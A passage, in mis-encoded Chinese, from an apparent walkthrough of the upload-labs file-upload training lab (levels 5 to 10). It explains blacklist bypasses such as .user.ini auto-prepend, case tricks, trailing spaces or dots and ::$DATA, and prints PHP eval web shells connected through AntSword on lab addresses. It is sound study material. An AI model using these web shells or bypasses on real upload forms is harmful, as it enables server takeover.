> ã€€ã€€fast cgiæ˜¯ä¸€ä¸ªå¸¸é©»(long-live)å‹çš„CGIï¼Œå®ƒå¯ä»¥ä¸€ç›´æ‰§è¡Œç€ï¼Œåªè¦æ¿€æ´»åï¼Œä¸ä¼šæ¯æ¬¡éƒ½è¦èŠ±è´¹æ—¶é—´å»forkä¸€ä¸ªæ–°è¿›ç¨‹ã€‚è¿™ç§æ–¹å¼ æ˜¯ä¸è¯­è¨€æ— å…³çš„ã€å¯ä¼¸ç¼©æ¶æ„çš„CGIå¼€æ”¾æ‰©å±•ï¼Œå…¶ä¸»è¦è¡Œä¸ºæ˜¯å°†CGIè§£é‡Šå™¨è¿›ç¨‹ä¿æŒåœ¨å†…å­˜ä¸­å¹¶å› æ­¤è·å¾—è¾ƒ é«˜çš„æ€§èƒ½ã€‚
>
>  
>
> FAST-CGI æ˜¯å¾®è½¯ä¸ºäº†è§£å†³ CGI è§£é‡Šå™¨çš„ä¸è¶³è€Œæå‡ºæ”¹è¿›æ–¹æ¡ˆã€‚å½“ä¸€ä¸ªè¯·æ±‚å‘ web server å‘é€è¯·æ±‚æ—¶ï¼Œweb serveræ€»ä¼šforkä¸€ä¸ªCGIè§£é‡Šå™¨è¿›ç¨‹è¿›è¡Œå¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œè¿›ç¨‹å¤„ç†å®Œæˆä¹‹åå°†ç»“æœè¿”å›ç»™web serverï¼Œweb serverå°†ç»“æœè¿”å›å¹¶æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿›ç¨‹ç»“æŸï¼Œå½“ç”¨æˆ·å†æ¬¡è¯·æ±‚åŒä¸€ä¸ªé¡µé¢æ—¶ï¼Œweb serveråˆä¼šforkä¸€ä¸ªæ–°è¿›ç¨‹è¿›è¡Œè¯·æ±‚å¤„ç†ï¼Œè¿™æ ·æ•ˆç‡ä¼šæ¯”è¾ƒä½ä¸‹ï¼ˆCGIè¢«äººè¯Ÿç—…çš„ä¸»è¦åŸå› ï¼‰ã€‚è€Œé‡‡ç”¨FAST-CGI è§£é‡Šå™¨çš„ è¯ï¼Œå½“ä¸€ä¸ªè¯·æ±‚æ‰§è¡Œå®Œæ¯•åä¸ä¼šæ³¨é”€è¯¥è¿›ç¨‹ï¼Œè€Œæ˜¯å°†æ”¹è¿›ç¨‹è¿›å…¥ä¼‘çœ æœŸï¼Œå½“æ¥æ”¶åˆ°æ–°çš„è¯·æ±‚æ—¶ï¼Œé‡æ–°å¯ç”¨æ”¹è¿›ç¨‹è¿›è¡Œå¤„ç†ã€‚FAST-CGI è¾ƒCGI å‡å°‘äº†è¿›ç¨‹çš„é‡å¤åˆ›å»ºçš„èµ„æºå ç”¨ã€‚
>
> ã€€ã€€è¿›ç¨‹ä¸çº¿ç¨‹ï¼šä¸€ä¸ªè¿›ç¨‹è‡³å°‘å­˜åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹ã€‚
>
>  
>
> **2ã€é€‰æ‹©**
>
> ã€€ã€€é€šå¸¸winä¸‹ PHP + Apache ç»„åˆï¼Œä»¥ ISAPI çš„æ–¹å¼è¿è¡Œã€‚
>
> ã€€ã€€è€Œlinuxä¸‹é€šå¸¸åˆ†ä¸º2ç§ï¼š
>
> ã€€ã€€ Apache + PHPï¼ŒPHPä¸€èˆ¬ä½œä¸ºApache çš„æ¨¡å—è¿›è¡Œè¿è¡Œï¼›
>
> ã€€ã€€ Nginx + PHP ï¼Œä»¥ phpfast cgiçš„æ–¹å¼ï¼Œå³php-fpmçš„æ–¹å¼è¿è¡Œï¼Œè¯¥æ–¹å¼å¯¹é«˜å¹¶å‘ã€é«˜è´Ÿè½½æœ‰è‰¯å¥½çš„æ€§èƒ½ä½“ç°ï¼Œå› æ­¤å¾ˆå¤šç½‘ç«™é‡‡ç”¨è¯¥æ–¹å¼è¿›è¡Œç¯å¢ƒçš„æ­å»ºã€‚
>
> ã€€ã€€Nginx è¾ƒApache çš„é…ç½®è¦å°‘å¾ˆå¤šï¼Œå› æ­¤äººä¸ºå‡ºé”™çš„æ¦‚ç‡è¦å°‘ä¸€ç‚¹ï¼Œä½†ä¹Ÿå› æ­¤ Apache çš„ ç¨³å®šæ€§è¦æ¯”Nginx é«˜ã€‚
>
>  
>
> å‰é¢åºŸè¯äº†é‚£ä¹ˆå¤šï¼Œä¸‹é¢æ‰æ˜¯é‡ç‚¹ ...
>
> **æ€»ç»“ï¼š**
>
> - **ä»¥ ISAPI æ–¹å¼è¿è¡Œå°±ç”¨ TS çº¿ç¨‹å®‰å…¨ç‰ˆ**
> - **ä»¥ FAST-CGI æˆ– PHP-FPM æ–¹å¼è¿è¡Œå°±ç”¨NTS éçº¿ç¨‹å®‰å…¨ç‰ˆ**
> - **é€šå¸¸ Windows ä¸‹ Apache + PHP é€‰TS ï¼ŒIISï¼ˆfast-cgiï¼‰ + PHP é€‰TNS**
> - **é€šå¸¸Linux ä¸‹ Apache + PHP é€‰TSï¼ŒNginx + PHP é€‰TNS**



+ <code>nts</code>ç‰ˆæœ¬ä¼šæŠ¥<code>500</code>å†…éƒ¨é”™è¯¯

![Pass04_2](./img/Pass04_2.png)



+ é<code>nts</code>ç‰ˆæœ¬æ²¡æœ‰è¿™æ ·çš„æ¡ä»¶å¯¼è‡´è¿™å…³æ”»å…³å¤±è´¥



## Pass05

+ ä½¿ç”¨çš„ç‰ˆæœ¬

â€‹	è¿™é‡Œæˆ‘ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯<code>php5.4.45 nts</code>ä»¥åŠ<code>Apache2.4.39</code>

![Pass05_1](./img/Pass05_1.PNG)

![Pass05_2](./img/Pass05_2.png)



+ ç‚¹å¼€æç¤º

![Pass05_3](./img/Pass05_3.png)



+ æŸ¥çœ‹æºç 

![Pass05_4](./img/Pass05_4.png)

â€‹        æºç é‡ŒæŠŠæ‰€æœ‰å¯ä»¥è§£æçš„åç¼€åéƒ½ç»™å†™æ­»äº†ï¼ŒåŒ…æ‹¬å¤§å°å†™ï¼Œè½¬æ¢ï¼Œç©ºæ ¼ï¼Œè¿˜æœ‰ç‚¹å·ï¼Œæ­£å¸¸çš„phpç±»æ–‡ä»¶ä¸Šä¼ ä¸äº†äº†ï¼Œå¹¶ä¸”æ‹’ç»ä¸Šä¼  <code>.htaccess</code> æ–‡ä»¶ï¼›åå¤è§‚å¯Ÿå‘ç°æ²¡æœ‰è¢«é™åˆ¶çš„åç¼€åæœ‰<code> .php7</code> ä»¥åŠ<code> .ini</code>



+ ç™¾åº¦ä¸€ç•ª<code>ini</code>çš„çŸ¥è¯†

~~~ tex
user.ini ï¼š è‡ª PHP 5.3.0 èµ·ï¼ŒPHP æ”¯æŒåŸºäºæ¯ä¸ªç›®å½•çš„ .htaccess é£æ ¼çš„ INI æ–‡ä»¶ã€‚æ­¤ç±»æ–‡ä»¶ä»…è¢«
CGIï¼FastCGI SAPI å¤„ç†ã€‚æ­¤åŠŸèƒ½ä½¿å¾— PECL çš„ htscanner æ‰©å±•ä½œåºŸã€‚å¦‚æœä½¿ç”¨ Apacheï¼Œåˆ™ç”¨
.htaccess æ–‡ä»¶æœ‰åŒæ ·æ•ˆæœã€‚
   
é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web
æ ¹ç›®å½•ï¼ˆ$_SERVER['DOCUMENT_ROOT'] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚
   
åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ INI
è®¾ç½®å¯è¢«è¯†åˆ«ã€‚
   
ä¸¤ä¸ªæ–°çš„ INI æŒ‡ä»¤ï¼Œuser_ini.filename å’Œ user_ini.cache_ttl æ§åˆ¶ç€ç”¨æˆ· INI æ–‡ä»¶çš„ä½¿ç”¨ã€‚
   
user_ini.filename è®¾å®šäº† PHP ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æœå¯»çš„æ–‡ä»¶åï¼›å¦‚æœè®¾å®šä¸ºç©ºå­—ç¬¦ä¸²åˆ™ PHP ä¸ä¼šæœå¯»ã€‚é»˜è®¤å€¼æ˜¯
.user.iniã€‚
   
user_ini.cache_ttl æ§åˆ¶ç€é‡æ–°è¯»å–ç”¨æˆ· INI æ–‡ä»¶çš„é—´éš”æ—¶é—´ã€‚é»˜è®¤æ˜¯ 300 ç§’ï¼ˆ5 åˆ†é’Ÿï¼‰ã€‚
~~~

<code>php.ini</code> æ˜¯<code>php</code>çš„é…ç½®æ–‡ä»¶ï¼Œ<code>.user.ini</code> ä¸­çš„å­—æ®µä¹Ÿä¼šè¢« <code>php</code> è§†ä¸ºé…ç½®æ–‡ä»¶æ¥å¤„ç†ï¼Œä»è€Œå¯¼è‡´<code>php</code>çš„æ–‡ä»¶è§£ææ¼æ´ã€‚



+ å¼•å‘<code>.user.ini</code>è§£ææ¼æ´éœ€è¦ä¸‰ä¸ªå‰ææ¡ä»¶

~~~ tex
æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP  

æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼  

ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶
~~~



+ ç™¾åº¦ä¸‹<code>CGI</code>

~~~ tex
ä»€ä¹ˆæ˜¯ CGI
    CGI çš„å…¨ç§°ä¸ºâ€œé€šç”¨ç½‘å…³æ¥å£â€ï¼ˆCommon Gateway Interfaceï¼‰ï¼Œä¸º HTTP æœåŠ¡å™¨ä¸å…¶ä»–æœºå™¨ä¸Šçš„ç¨‹åºæœåŠ¡é€šä¿¡äº¤æµçš„ä¸€ç§å·¥å…·ï¼Œ CGI ç¨‹åºé¡»è¿è¡Œåœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Šã€‚
    ä¼ ç»Ÿ CGI æ¥å£æ–¹å¼çš„ä¸»è¦ç¼ºç‚¹æ˜¯æ€§èƒ½è¾ƒå·®ï¼Œå› ä¸ºæ¯æ¬¡ HTTP æœåŠ¡å™¨é‡åˆ°åŠ¨æ€ç¨‹åºæ—¶éƒ½éœ€è¦é‡æ–°å¯åŠ¨è§£æå™¨æ¥æ‰§è¡Œè§£æï¼Œä¹‹åç»“æœæ‰ä¼šè¢«è¿”å›ç»™ HTTPæœåŠ¡å™¨ã€‚è¿™åœ¨å¤„ç†é«˜å¹¶å‘è®¿é—®æ—¶å‡ ä¹æ˜¯ä¸å¯ç”¨çš„ï¼Œå› æ­¤å°±è¯ç”Ÿäº† FastCGIã€‚å¦å¤–ï¼Œä¼ ç»Ÿçš„ CGI æ¥å£æ–¹å¼å®‰å…¨æ€§ä¹Ÿå¾ˆå·®ï¼Œæ•…è€Œç°åœ¨å·²ç»å¾ˆå°‘è¢«ä½¿ç”¨äº†ã€‚
   
ä»€ä¹ˆæ˜¯ FastCGI
    FastCGI æ˜¯ä¸€ä¸ªå¯ä¼¸ç¼©åœ°ã€é«˜é€Ÿåœ°åœ¨HTTPæœåŠ¡å™¨å’ŒåŠ¨æ€æœåŠ¡è„šæœ¬è¯­è¨€é—´é€šä¿¡çš„æ¥å£ï¼ˆåœ¨ Linux ä¸‹ï¼Œ FastCGI æ¥å£å³ä¸º socketï¼Œè¿™ä¸ªsocket å¯ä»¥æ˜¯æ–‡ä»¶ socketï¼Œä¹Ÿå¯ä»¥æ˜¯IP socketï¼‰ï¼Œä¸»è¦ä¼˜ç‚¹æ˜¯æŠŠåŠ¨æ€è¯­è¨€å’Œ HTTPæœåŠ¡å™¨åˆ†ç¦»å¼€æ¥ã€‚å¤šæ•°æµè¡Œçš„ HTTP æœåŠ¡å™¨éƒ½æ”¯æŒ FastCGIï¼ŒåŒ…æ‹¬ Apache ã€ Nginx å’Œ Lighttpd ç­‰ã€‚
    åŒæ—¶ï¼ŒFastCGIä¹Ÿè¢«è®¸å¤šè„šæœ¬è¯­è¨€æ‰€æ”¯æŒï¼Œä¾‹å¦‚å½“å‰æ¯”è¾ƒæµè¡Œçš„è„šæœ¬è¯­è¨€PHPã€‚FastCGI æ¥å£é‡‡ç”¨çš„æ˜¯C/Sæ¶æ„ï¼Œå®ƒå¯ä»¥å°† HTTP æœåŠ¡å™¨å’Œè„šæœ¬æœåŠ¡å™¨åˆ†å¼€ï¼ŒåŒæ—¶è¿˜èƒ½åœ¨è„šæœ¬è§£ææœåŠ¡å™¨ä¸Šå¯åŠ¨ä¸€ä¸ªæˆ–å¤šä¸ªè„šæœ¬æ¥è§£æå®ˆæŠ¤è¿›ç¨‹ã€‚å½“ HTTPæœåŠ¡å™¨é‡åˆ°åŠ¨æ€ç¨‹åºæ—¶ï¼Œå¯ä»¥å°†å…¶ç›´æ¥äº¤ä»˜ç»™ FastCGI è¿›ç¨‹æ¥æ‰§è¡Œï¼Œç„¶åå°†å¾—åˆ°ç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™ç§æ–¹å¼å¯ä»¥è®© HTTPæœåŠ¡å™¨ä¸“ä¸€åœ°å¤„ç†é™æ€è¯·æ±‚ï¼Œæˆ–è€…å°†åŠ¨æ€è„šæœ¬æœåŠ¡å™¨çš„ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæé«˜æ•´ä¸ªåº”ç”¨ç³»ç»Ÿçš„æ€§èƒ½ã€‚
~~~



+ å¯¹æ¯”ä¸‹ï¼Œ<code>php</code>è¯­è¨€ä¸<code>CGI</code>å¯¹äºæˆ‘ä»¬çš„<code>Apache</code>å’Œç¯å¢ƒå‡æ»¡è¶³



+ åˆ›å»º<code>.user.ini</code>æ–‡ä»¶å¹¶ä¸Šä¼ 

![Pass05_5](./img/Pass05_5.png)

<code>.user.ini</code>æ–‡ä»¶é‡Œçš„æ„æ€æ˜¯ï¼šæ‰€æœ‰çš„<code>php</code>æ–‡ä»¶éƒ½è‡ªåŠ¨åŒ…å«<code>666.jpg</code>æ–‡ä»¶ã€‚<code>.user.ini</code>ç›¸å½“äºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„<code>php.ini</code>



+ ä¸Šä¼ <code>666.jpg</code>æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š

![Pass05_6](./img/Pass05_6.PNG)



+ ä½¿ç”¨èšå‰‘è¿æ¥

  + ç­‰å¾…5åˆ†é’Ÿ
  + å¤åˆ¶å›¾åƒåœ°å€

  ![Pass05_7](./img/Pass05_7.png)

  ![Pass05_8](./img/Pass05_8.png)

  

  + å³é”®ç‚¹å‡»æ·»åŠ æ•°æ®ï¼Œç”¨èšå‰‘è®¿é—®

![Pass05_9](./img/Pass05_9.png)



+ é…ç½®æ•°æ®ï¼Œå°†<code>URL</code>åœ°å€è®¾ä¸ºå›¾åƒåœ°å€ï¼Œä½†æ–‡ä»¶åæ”¹ä¸º<code>readme.php</code>ï¼Œè¿æ¥å¯†ç è®¾ç½®ä¸º 666

![Pass05_10](./img/Pass05_10.png)



+ ç‚¹å‡»ç¡®å®šï¼Œå‘ç°å·²ç»æ‹¿åˆ°<code>shell</code>

![Pass05_11](./img/Pass05_11.png)



+ åŒå‡»<code>shell</code>ï¼Œå‡ºç°å¯¹åº”çš„æ•°æ®ï¼ŒæˆåŠŸ

![Pass05_12](./img/Pass05_12.PNG)



~~~ tex
ps: èšå‰‘ç›¸å…³çš„æ–‡æ¡£æŸ¥çœ‹å¯¹åº”çš„url:
	https://github.com/AntSwordProject
	https://github.com/AntSwordProject/antSword
	https://github.com/AntSwordProject/AntSword-Loader
	https://github.com/eastmountyxz/AntSword-Experiment
~~~



## Pass06

![Pass06_1](./img/Pass06_1.png)

+ æŸ¥çœ‹æºç ï¼Œå’Œç¬¬å››å…³å¯¹æ¯”å‘ç°è¿™å…³æ²¡æœ‰è½¬æ¢å¤§å°å†™çš„ä»£ç ï¼Œé€†æ¨ä¸€ä¸‹ æœ€åè¦å¾—åˆ°<code>xxx.php</code>é‚£ä¹ˆ<code>$file_ext</code>å°±è¦æ˜¯php é»‘åå•é‡Œé¢å°±ç¦æ­¢äº†<code>pHp</code>ï¼Œæ²¡æœ‰ç¦æ­¢<code>phP</code> ã€<code>Php</code>ï¼Œè¿™æ ·å¯ä»¥ä¸Šä¼ å¤§å°å†™æ··åˆçš„åç¼€åç»•è¿‡



+ è¿™é‡Œç‰ˆæœ¬å¾—é€‰æ‹©é<code>nts</code>ç‰ˆæœ¬çš„æ‰èƒ½æˆåŠŸï¼Œå¦‚æœæ˜¯<code>nts</code>ç‰ˆæœ¬ä¼šæŠ¥<code>http 500</code>æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚åœ¨è¿™é‡Œæˆ‘ä¸Šä¼ äº†<code>6.Php</code>

![Pass06_2](./img/Pass06_2.PNG)



+ ä¸Šä¼ ä¹‹åç”±äºæ˜¯<code>nts</code>ç‰ˆæœ¬çš„<code>php</code>ç‰ˆæœ¬ï¼Œæ‰€ä»¥æŠ¥äº†<code>http 500</code>æœåŠ¡å™¨å†…éƒ¨é”™è¯¯

![Pass06_3](./img/Pass06_3.PNG)



+ æ¢ä¸€ç§æ–¹æ³•ï¼Œç”¨èšå‰‘è¿æ¥

  + å…ˆå®šä¹‰è„šæœ¬<code>SixSecondMethod</code>

  ~~~ shell
  <?php @eval($_POST['SixSecond']); ?>
  ~~~

  ![Pass06_4](./img/Pass06_4.PNG)



+ + ä¸Šä¼ <code>SixSecondMethod</code>æ–‡ä»¶

![Pass06_5](./img/Pass06_5.png)



+ + å¤åˆ¶å¯¹åº”çš„<code>SixSecondMethod</code>æ–‡ä»¶åœ°å€

  ~~~ shell
  http://192.168.31.126:8080/upload-labs/upload/202401310207471991.Php
  ~~~

  ![Pass06_6](./img/Pass06_6.png)



+ + ä½¿ç”¨èšå‰‘æ·»åŠ æ•°æ®å¹¶é…ç½®ç›¸å…³ä¿¡æ¯

  ![Pass06_7](./img/Pass06_7.png)



+ + æœ€åå‘ç°é…ç½®æˆåŠŸï¼Œä½†ç”±äº<code>php</code>ç‰ˆæœ¬æ˜¯<code>nts</code>å¯¼è‡´äº†æœåŠ¡å™¨å‡ºç°<code>500</code>é”™è¯¯æ— æ³•æˆåŠŸæ‹¿åˆ°<code>shell</code>

  ![Pass06_8](./img/Pass06_8.PNG)



## Pass07

### æ–¹æ³•ä¸€

+ é¦–å…ˆæŸ¥çœ‹æºç ï¼Œå¯¹æ¯”ä¸Šä¸€å…³å‘ç°å°‘äº†æ”¶å°¾å»ç©º

![Pass07_1](./img/Pass07_1.png)



+ æ€è·¯æ˜¯åœ¨æ–‡ä»¶åé¢åŠ ç©ºæ ¼ï¼Œä½†ç”±äº<code>windows</code>ç‰¹æ€§ï¼Œæ–‡ä»¶ååç©ºæ ¼ä¼šç›´æ¥åˆ é™¤ï¼Œä¸èƒ½ç›´æ¥ä¸Šä¼ <code>.php</code>ååŠ ç©ºæ ¼ï¼Œæ‰€ä»¥è¦ç”¨<code>burp</code>æŠ“åŒ…åå†åŠ ç©ºæ ¼å¦‚ä¸‹å›¾

![Pass07_2](./img/Pass07_2.png)



+ å¦‚ä¸‹æ‰€ç¤ºï¼Œç»•è¿‡æˆåŠŸ

![Pass07_3](./img/Pass07_3.png)

![Pass07_4](./img/Pass07_4.PNG)



### æ–¹æ³•äºŒ

+ é¦–å…ˆç¼–å†™è„šæœ¬<code>SevenSecondMethod.php</code>

~~~ shell
<?php @eval($_POST['SevenSecond']); ?>
~~~

![Pass07_5](./img/Pass07_5.PNG)



+ ä¸Šä¼ ç›¸åº”çš„åå°è„šæœ¬<code>SevenSecondMethod.php</code>

![Pass07_6](./img/Pass07_6.PNG)



+ ç”¨<code>burpsuite</code>æ‹¦æˆªç„¶åä¿®æ”¹<code>SevenSecondMethod.php</code>ä¸º<code>SevenSecondMethod.php </code>å³åœ¨æ–‡ä»¶åé¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œç„¶åå‘ç°ä¸Šä¼ æˆåŠŸ

![Pass07_7](./img/Pass07_7.png)



+ å³é”®æ‰“å¼€å›¾ç‰‡ç½‘å€æ‰¾åˆ°ä¸Šä¼ æ–‡ä»¶<code>SevenSecondMethod.php</code>çš„ç½‘å€

![Pass07_8](./img/Pass07_8.png)

![Pass07_9](./img/Pass07_9.png)



+ åœ¨èšå‰‘æ·»åŠ æ•°æ®ï¼Œå¹¶é…ç½®ç›¸åº”çš„å‚æ•°ï¼Œ<code>URLåœ°å€</code>å¡«å†™ä¸Šä¼ æ–‡ä»¶çš„ç½‘å€ï¼Œ<code>è¿æ¥å¯†ç </code>æ ¹æ®è„šæœ¬<code>SevenSecondMethod.php</code>é‡Œçš„æ•°æ®å¡«å†™

![Pass07_10](./img/Pass07_10.png)



+ é…ç½®æˆåŠŸåå‘ç°å¯è¿æ¥æˆåŠŸ

![Pass07_11](./img/Pass07_11.PNG)



+ åŒå‡»å·²ç»æ·»åŠ çš„æ•°æ®ï¼Œå‘ç°<code>getshell</code>æˆåŠŸ

![Pass07_12](./img/Pass07_12.PNG)



## Pass08

### æ–¹æ³•ä¸€

+ é¦–æ¬¡æŸ¥çœ‹æç¤º

![Pass08_1](./img/Pass08_1.PNG)



+ æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ç¼ºå°‘äº†<code>deldot</code>å‡½æ•°ï¼ˆç”¨äºåˆ é™¤æ–‡ä»¶åæœ€åä¸€ä¸ªç‚¹ï¼Œå¦‚æœæœ‰å¤šä¸ªè¿ç»­çš„.... ä¼šå…¨éƒ¨åˆ é™¤ï¼‰ã€‚ä½†æ˜¯ä¾æ®<code>Windows</code>ç³»ç»Ÿä¿å­˜æ–‡ä»¶çš„ç‰¹æ€§åŒæ ·ä¼šåˆ é™¤æ–‡ä»¶åç¼€åçš„<code>xxx.php.</code>æœ€åçš„ç‚¹<code>.</code> åˆ™æœ€åä¸Šä¼ çš„æ–‡ä»¶è¿˜æ˜¯<code>xxx.php</code>

![Pass08_2](./img/Pass08_2.PNG)



+ ç¼–å†™ç›¸åº”çš„è„šæœ¬æ–‡ä»¶<code>EightFirstMethod.php</code>

~~~ shell
<?php phpinfo(); ?>
~~~

![Pass08_3](./img/Pass08_3.PNG)



+ ä¸Šä¼ ç›¸åº”çš„è„šæœ¬æ–‡ä»¶<code>EightFirstMethod.php</code>

![Pass08_5](./img/Pass08_5.PNG)



+ ä¸Šä¼ åç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶å°†<code>EightFirstMethod.php</code>çš„åç¼€åæ·»åŠ ç‚¹å·<code>.</code>å˜ä¸º<code>EightFirstMethod.php.</code>

![Pass08_6](./img/Pass08_6.png)



+ ä¸Šä¼ åå³é”®æ‰“å¼€ç›¸åº”çš„æ–‡ä»¶

![Pass08_8](./img/Pass08_8.png)



+ æœ€åå‘ç°è„šæœ¬æˆåŠŸæ‰§è¡Œ

![Pass08_9](./img/Pass08_9.png)



### æ–¹æ³•äºŒ

+ é¦–å…ˆç¼–å†™ç›¸åº”çš„è„šæœ¬æ–‡ä»¶<code>EightSecondMethod.php</code>

~~~ shell
<?php @eval($_POST['EightSecond']); ?>
~~~

![Pass08_4](./img/Pass08_4.PNG)



+ ä¸Šä¼ ç›¸åº”çš„è„šæœ¬æ–‡ä»¶<code>EightSecondMethod.php</code>

![Pass08_10](./img/Pass08_10.png)



+ ä¸Šä¼ åç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶å°†<code>EightSecondMethod.php</code>çš„åç¼€åæ·»åŠ ç‚¹å·<code>.</code>å˜ä¸º<code>EightSecondMethod.php.</code>

![Pass08_11](./img/Pass08_11.png)



+ ä¸Šä¼ åå³é”®æ‰“å¼€ç›¸åº”çš„æ–‡ä»¶

![Pass08_12](./img/Pass08_12.png)



+ æ‰“å¼€ç›¸åº”çš„æ–‡ä»¶åå¤åˆ¶å¯¹åº”çš„æ–‡ä»¶ç½‘å€

![Pass08_13](./img/Pass08_13.png)



+ ç”¨èšå‰‘æ·»åŠ æ•°æ®å¹¶é…ç½®ç›¸åº”çš„å‚æ•°ï¼Œ<code>URLåœ°å€</code>å¡«å†™ä¸Šä¼ æ–‡ä»¶çš„ç½‘å€ï¼Œ<code>è¿æ¥å¯†ç </code>æ ¹æ®è„šæœ¬<code>EightSecondMethod.php</code>é‡Œçš„æ•°æ®å¡«å†™

![Pass08_14](./img/Pass08_14.png)



+ é…ç½®åæµ‹è¯•å‘ç°è¿æ¥æˆåŠŸ

![Pass08_15](./img/Pass08_15.png)



+ åŒå‡»å·²ç»æ·»åŠ çš„æ•°æ®ï¼Œå‘ç°æˆåŠŸ<code>getshell</code>

![Pass08_16](./img/Pass08_16.PNG)



## Pass09

### æ–¹æ³•ä¸€

+ é¦–å…ˆçœ‹é¢˜ç›®æç¤º

![Pass09_1](./img/Pass09_1.png)



+ çœ‹æºç ï¼Œçœ‹åˆ°è¿™ä¸€å…³é»‘åå•æ²¡æœ‰å¯¹<code>::$DATA </code>è¿› è¡Œ å¤„ ç† ä½¿ç”¨<code>::$DATA</code> è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨<code>::$DATA</code>ç»•è¿‡é»‘åå•

> è¡¥å……çŸ¥è¯†ï¼š<code>php</code>åœ¨<code>window</code>çš„æ—¶å€™å¦‚æœæ–‡ä»¶å+<code>"::$DATA"</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ<code>"::$DATA"</code>ä¹‹å‰çš„æ–‡ä»¶å 

![Pass09_2](./img/Pass09_2.png)



+ ç¼–è¾‘è„šæœ¬<code>NinethFirstMethod.php</code>

~~~ shell
<?php phpinfo(); ?>
~~~

![Pass09_3](./img/Pass09_3.PNG)



+ ä¸Šä¼ ä¹‹å‰ç¼–è¾‘çš„è„šæœ¬<code>NinethFirstMethod.php</code>

![Pass09_5](./img/Pass09_5.PNG)



+ ç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶<code>NinethFirstMethod.php</code>çš„åç¼€ä¸º<code>NinethFirstMethod.php::$DATA</code>

![Pass09_6](./img/Pass09_6.PNG)

![Pass09_7](./img/Pass09_7.png)



+ å¯ä»¥çœ‹åˆ°æ–‡ä»¶<code>NinethFirstMethod.php</code>ä¸Šä¼ æˆåŠŸ

![Pass09_8](./img/Pass09_8.png)



+ å³é”®æ‰“å¼€æ–‡ä»¶

![Pass09_9](./img/Pass09_9.png)



+ å¯ä»¥çœ‹åˆ°è„šæœ¬ä¸Šä¼ æˆåŠŸä½†æ²¡åŠæ³•æˆåŠŸæ‰§è¡Œ

![Pass09_10](./img/Pass09_10.png)



### æ–¹æ³•äºŒ

+ ç¼–è¾‘è„šæœ¬<code>NinethSecondMethod.php</code>

~~~ shell
<?php @eval($_POST['NineSecond']); ?>
~~~

![Pass09_4](./img/Pass09_4.png)



+ ä¸Šä¼ æ–‡ä»¶<code>NinethSecondMethod.php</code>

![Pass09_11](./img/Pass09_11.PNG)



+ ç”¨<code>burpsuite</code>æ‹¦æˆªå¹¶ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶<code>NinethSecondMethod.php</code>çš„åç¼€ä¸º<code>NinethSecondMethod.php::$DATA</code>

![Pass09_12](./img/Pass09_12.png)

![Pass09_13](./img/Pass09_13.png)



+ å¯ä»¥çœ‹åˆ°æ–‡ä»¶<code>NinethSecondMethod.php</code>ä¸Šä¼ æˆåŠŸ

![Pass09_14](./img/Pass09_14.PNG)



+ å³é”®æ‰“å¼€æ–‡ä»¶<code>NinethSecondMethod.php</code>

![Pass09_15](./img/Pass09_15.png)



+ å¤åˆ¶æ‰“å¼€æ–‡ä»¶<code>NinethSecondMethod.php</code>çš„ç½‘å€

~~~ shell
http://192.168.0.102:8080/upload-labs/upload/202402050507382067.php::$data
~~~

![Pass09_16](./img/Pass09_16.png)



+ æ‰“å¼€èšå‰‘ï¼Œé…ç½®ç›¸åº”çš„æ•°æ®ï¼›<code>URLåœ°å€</code>å¡«å†™ä¸Šä¼ æ–‡ä»¶çš„ç½‘å€ï¼Œ<code>è¿æ¥å¯†ç </code>æ ¹æ®è„šæœ¬<code>NineSecondMethod.php</code>é‡Œçš„æ•°æ®å¡«å†™

![Pass09_17](./img/Pass09_17.png)



+ å¯çœ‹åˆ°ï¼Œæ·»åŠ æ•°æ®æˆåŠŸ

![Pass09_18](./img/Pass09_18.png)



+ åŒå‡»æ‰“å¼€æ•°æ®ï¼Œ<code>getshell</code>æˆåŠŸ

![Pass09_19](./img/Pass09_19.PNG)



## Pass10

### æ–¹æ³•ä¸€

+ é¦–å…ˆæŸ¥çœ‹æç¤º

![Pass10_1](./img/Pass10_1.png)



+ æŸ¥çœ‹æºä»£ç 

![Pass10_2](./img/Pass10_2.png)

